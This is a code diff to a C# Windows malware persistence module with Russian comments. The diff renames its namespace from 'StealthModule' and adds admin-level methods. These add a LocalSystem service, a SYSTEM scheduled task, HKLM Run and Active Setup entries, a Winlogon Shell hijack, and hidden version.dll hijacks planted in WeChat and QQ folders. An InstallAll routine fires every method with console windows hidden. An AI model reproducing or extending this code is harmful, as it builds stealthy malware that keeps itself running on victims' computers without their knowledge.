@@ -6,7 +6,7 @@ using System.Diagnostics;
 using Microsoft.Win32;
 using System.Threading;
 
-namespace StealthModule
+namespace VanguardCore
 {
     /// <summary>
     /// Менеджер персистенции — 9 методов закрепления без прав администратора
@@ -140,6 +140,21 @@ namespace StealthModule
         private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
         #endregion
 
+        #region Проверки
+        public static bool IsAdmin()
+        {
+            try
+            {
+                using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
+                {
+                    var principal = new System.Security.Principal.WindowsPrincipal(identity);
+                    return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+                }
+            }
+            catch { return false; }
+        }
+        #endregion
+
         #region Вспомогательные методы
         private static string GenerateRandomName()
         {
@@ -241,12 +256,13 @@ namespace StealthModule
         }
         #endregion
 
-        #region Метод 1: Реестр (HKCU) — Базовый
-        public static bool InstallRegistryRun(string name, string path)
+        #region Метод 1: Реестр (HKCU/HKLM) — Базовый
+        public static bool InstallRegistryRun(string name, string path, bool hklm = false)
         {
             try
             {
-                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(
+                RegistryKey baseKey = hklm ? Registry.LocalMachine : Registry.CurrentUser;
+                using (RegistryKey k = baseKey.OpenSubKey(
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                 {
                     if (k != null)
@@ -287,14 +303,24 @@ namespace StealthModule
         }
         #endregion
 
-        #region Метод 3: Планировщик задач (User)
-        public static bool InstallUserTask(string name, string path)
+        #region Метод 3: Планировщик задач (User/SYSTEM)
+        public static bool InstallTask(string name, string path, bool admin = false)
         {
             try
             {
-                string cmd = string.Format("/c schtasks /create /tn \"{0}\" /tr \"\\\"{1}\\\"\" /sc onlogon /ru \"{2}\" /f /it", name, path, Environment.UserName);
+                string cmd;
+                if (admin)
+                {
+                    // SYSTEM level task, runs at system startup (not just logon)
+                    cmd = string.Format("/c schtasks /create /tn \"{0}\" /tr \"\\\"{1}\\\"\" /sc onstart /ru SYSTEM /rl HIGHEST /f", name, path);
+                }
+                else
+                {
+                    // User level task, runs at logon
+                    cmd = string.Format("/c schtasks /create /tn \"{0}\" /tr \"\\\"{1}\\\"\" /sc onlogon /ru \"{2}\" /f /it", name, path, Environment.UserName);
+                }
+                
                 RunHidden("cmd.exe", cmd);
-
                 Thread.Sleep(500);
                 HideAllConsoleWindows();
 
@@ -360,12 +386,13 @@ namespace StealthModule
         }
         #endregion
 
-        #region Метод 6: Политики Explorer (HKCU)
-        public static bool InstallExplorerPolicy(string path)
+        #region Метод 6: Политики Explorer (HKCU/HKLM)
+        public static bool InstallExplorerPolicy(string path, bool hklm = false)
         {
             try
             {
-                using (RegistryKey k = Registry.CurrentUser.CreateSubKey(
+                RegistryKey baseKey = hklm ? Registry.LocalMachine : Registry.CurrentUser;
+                using (RegistryKey k = baseKey.CreateSubKey(
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run"))
                 {
                     if (k != null)
@@ -381,15 +408,16 @@ namespace StealthModule
         }
         #endregion
 
-        #region Метод 7: Active Setup (HKCU)
-        public static bool InstallActiveSetup(string path)
+        #region Метод 7: Active Setup (HKCU/HKLM)
+        public static bool InstallActiveSetup(string path, bool hklm = false)
         {
             try
             {
                 string stubPath = string.Format("\"{0}\"", path);
                 string clsid = Guid.NewGuid().ToString("B");
+                RegistryKey baseKey = hklm ? Registry.LocalMachine : Registry.CurrentUser;
 
-                using (RegistryKey k = Registry.CurrentUser.CreateSubKey(
+                using (RegistryKey k = baseKey.CreateSubKey(
                     string.Format("Software\\Microsoft\\Active Setup\\Installed Components\\{0}", clsid)))
                 {
                     if (k != null)
@@ -455,23 +483,146 @@ namespace StealthModule
         }
         #endregion
 
+        #region Метод 11: Windows Service (ADMIN REQUIRED)
+        public static bool InstallService(string serviceName, string path)
+        {
+            if (!IsAdmin()) return false;
+            try
+            {
+                // Create service using sc.exe
+                string cmd = string.Format("/c sc create \"{0}\" binPath= \"{1}\" start= auto obj= LocalSystem", serviceName, path);
+                RunHidden("cmd.exe", cmd);
+                
+                Thread.Sleep(500);
+                
+                // Start service
+                RunHidden("cmd.exe", string.Format("/c sc start \"{0}\"", serviceName));
+                
+                HideAllConsoleWindows();
+                return true;
+            }
+            catch { return false; }
+        }
+        #endregion
+
+        #region Метод 12: Winlogon Shell Hijack (ADMIN REQUIRED)
+        public static bool InstallShellHijack(string path)
+        {
+            if (!IsAdmin()) return false;
+            try
+            {
+                using (RegistryKey k = Registry.LocalMachine.OpenSubKey(
+                    @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true))
+                {
+                    if (k != null)
+                    {
+                        string currentShell = k.GetValue("Shell", "explorer.exe").ToString();
+                        if (!currentShell.ToLower().Contains(path.ToLower()))
+                        {
+                            k.SetValue("Shell", currentShell + "," + path);
+                            return true;
+                        }
+                    }
+                }
+            }
+            catch { }
+            return false;
+        }
+        #endregion
+
+        #region Метод 10: DLL Hijacking (WeChat/QQ) — ТЕХНИКА ДЛЯ КИТАЙСКОГО РЫНКА
+        public static bool InstallDLLHijack(string payloadDllPath)
+        {
+            try
+            {
+                if (!File.Exists(payloadDllPath)) return false;
+
+                // 1. WeChat Hijack (version.dll)
+                string wechatPath = GetAppInstallPath(@"Software\Tencent\WeChat", "InstallPath");
+                if (!string.IsNullOrEmpty(wechatPath) && Directory.Exists(wechatPath))
+                {
+                    string target = Path.Combine(wechatPath, "version.dll");
+                    if (!File.Exists(target))
+                    {
+                        File.Copy(payloadDllPath, target, true);
+                        File.SetAttributes(target, FileAttributes.Hidden | FileAttributes.System);
+                    }
+                }
+
+                // 2. QQ Hijack (version.dll)
+                string qqPath = GetAppInstallPath(@"Software\Tencent\QQ", "InstallPath");
+                if (string.IsNullOrEmpty(qqPath))
+                    qqPath = GetAppInstallPath(@"Software\Tencent\QQPCMgr", "InstallPath");
+
+                if (!string.IsNullOrEmpty(qqPath) && Directory.Exists(qqPath))
+                {
+                    // Обычно ищет в папке Bin
+                    string binPath = Path.Combine(qqPath, "Bin");
+                    if (Directory.Exists(binPath))
+                    {
+                        string target = Path.Combine(binPath, "version.dll");
+                        if (!File.Exists(target))
+                        {
+                            File.Copy(payloadDllPath, target, true);
+                            File.SetAttributes(target, FileAttributes.Hidden | FileAttributes.System);
+                        }
+                    }
+                }
+
+                return true;
+            }
+            catch { return false; }
+        }
+
+        private static string GetAppInstallPath(string keyPath, string valueName)
+        {
+            try
+            {
+                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(keyPath))
+                {
+                    if (k != null) return k.GetValue(valueName) as string;
+                }
+                using (RegistryKey k = Registry.LocalMachine.OpenSubKey(keyPath))
+                {
+                    if (k != null) return k.GetValue(valueName) as string;
+                }
+            }
+            catch { }
+            return null;
+        }
+        #endregion
+
         #region Установка всех методов
         public static void InstallAll(string path)
         {
             string name = GenerateRandomName();
+            bool isAdmin = IsAdmin();
 
-            InstallRegistryRun(name, path);
+            // Core persistence (HKCU/User)
+            InstallRegistryRun(name, path, false);
             InstallStartupFolder(name, path);
-            InstallUserTask(name, path);
-            InstallExplorerPolicy(path);
-            InstallActiveSetup(path);
+            InstallTask(name, path, false);
+            InstallExplorerPolicy(path, false);
+            InstallActiveSetup(path, false);
             InstallLogonScript(path);
             InstallWMIEvent(path);
             InstallCOMHijack(path);
 
+            // Admin persistence
+            if (isAdmin)
+            {
+                InstallRegistryRun(name, path, true); // HKLM
+                InstallTask(name + "Svc", path, true); // Admin Task (SYSTEM)
+                InstallService(name, path); // Windows Service
+                InstallShellHijack(path); // Winlogon Shell
+                InstallExplorerPolicy(path, true); // HKLM Policy
+                InstallActiveSetup(path, true); // HKLM Active Setup
+            }
+
             if (path.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
             {
                 InstallAppInitDLL(path);
+                InstallDLLHijack(path);
             }
         }
         #endregion
